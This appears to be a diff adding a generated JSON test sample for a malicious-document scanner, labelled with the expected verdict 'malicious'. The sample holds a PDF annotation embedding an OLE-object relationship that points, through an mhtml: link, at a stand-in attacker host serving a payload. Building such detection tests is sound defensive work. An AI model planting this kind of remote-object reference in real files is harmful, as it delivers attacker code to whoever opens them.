@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::93::binary-variations::4",
+  "base_sample_id": "exp::document-office::93",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -945527796,
+  "content": "{\n  \"format\": \"pdf\",\n  \"annotations\": [\n    {\n      \"type\": \"Popup\",\n      \"contents\": \"<Relationship Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\\\" Target=\\\"mhtml:http://evil.example.com/payload!x.html\\\"/>\\n\",\n      \"page\": 1,\n      \"rect\": [\n        100,\n        700,\n        400,\n        720\n      ]\n    }\n  ]\n}",
+  "content_hash": "92f3cb5e15020bc79f12e0db06eeed4dc0fd6e8b26ed8e6a58f45d2914adc311",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-annotation",
+  "difficulty": "advanced"
+}
